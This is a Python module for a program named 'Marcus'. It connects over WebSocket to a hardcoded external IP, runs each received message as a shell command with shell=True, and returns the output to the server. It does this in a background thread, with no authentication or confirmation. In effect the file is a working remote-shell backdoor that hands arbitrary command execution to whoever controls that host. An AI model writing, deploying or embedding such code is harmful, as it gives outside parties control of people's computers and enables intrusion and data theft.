import asyncio
import threading
import websockets
import subprocess
import os

server_connected_event = threading.Event()
MAX_RECONNECT_ATTEMPTS = 3  # Allow only 3 reconnect attempts
latest_command = None  # Global variable to store the latest command

def set_command(command):
    """Stores the latest command received from the server."""
    global latest_command
    latest_command = command

def get_command():
    """Returns the latest command and resets it."""
    global latest_command
    cmd = latest_command
    latest_command = None  # Reset after fetching
    return cmd

async def send_ping(websocket):
    """Sends periodic ping messages to keep the connection alive."""
    while True:
        try:
            await websocket.ping()
            await asyncio.sleep(30)  # Send a ping every 30 seconds
        except websockets.exceptions.ConnectionClosed:
            print("⚠ Ping failed: Connection closed.")
            break
        except Exception as e:
            print(f"⚠ Ping failed: {e}")
            break

async def websocket_manager():
    """Handles WebSocket connection & receives commands."""
    reconnect_attempts = 0

    while reconnect_attempts < MAX_RECONNECT_ATTEMPTS:
        try:
            async with websockets.connect("ws://4.213.152.184:9001",
                ping_interval=30,
                ping_timeout=300,
            ) as websocket:
                print("✅ Connected to the server.")
                server_connected_event.set()
                reconnect_attempts = 0  # Reset counter on success

                # Start the keepalive ping task
                ping_task = asyncio.create_task(send_ping(websocket))

                # Notify server about connection
                await websocket.send("Marcus is connected!")

                while True:
                    try:
                        command = await websocket.recv()
                        print(f"📩 Received Command: {command}")
                        set_command(command)
                        await execute_command(command, websocket)
                    except websockets.exceptions.ConnectionClosed:
                        print("❌ Connection closed by the server.")
                        print("🔌 Marcus disconnected!")
                        break

        except Exception as e:
            reconnect_attempts += 1
            print(f"❌ Connection failed: {e}. Retrying ({reconnect_attempts}/{MAX_RECONNECT_ATTEMPTS})...")
            server_connected_event.clear()
            await asyncio.sleep(5)  # Wait before retrying

    print("❌ Server unreachable. Exiting application.")
    print("Marcus disconnected!")
    shutdown_application()

async def execute_command(command, websocket):
    """Executes received commands & sends response asynchronously."""
    try:
        # Default: Run shell command
        process = subprocess.run(command, shell=True, capture_output=True, text=True)
        response = process.stdout if process.stdout else process.stderr
        await websocket.send(response)

    except Exception as e:
        print(f"⚠ Error executing command: {e}")
        await websocket.send(f"Error executing command: {e}")

def websocket_in_background():
    """Starts WebSocket in a separate thread."""
    thread = threading.Thread(target=lambda: asyncio.run(websocket_manager()), daemon=True)
    thread.start()
    return thread  # Return thread reference for proper termination

def shutdown_application():
    """Closes all running threads and forcefully exits the program."""
    print("🛑 Shutting down Marcus...")
    os._exit(0)  # Force exit the entire program (including all threads)